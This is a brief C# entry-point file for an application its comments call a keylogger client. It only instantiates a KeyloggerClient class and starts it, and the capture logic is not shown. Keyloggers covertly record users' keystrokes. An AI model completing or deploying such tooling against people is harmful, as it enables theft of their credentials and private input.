using KeyloggerClient;

/// <summary>
/// Entry point for the keylogger client application.
/// </summary>
class Program
{
    /// <summary>
    /// The main asynchronous entry method that starts the keylogger client.
    /// </summary>
    /// <returns>A Task representing the asynchronous operation.</returns>
    static async Task Main()
    {
        var client = new KeyloggerClient.KeyloggerClient();
        await client.StartAsync();
    }
}
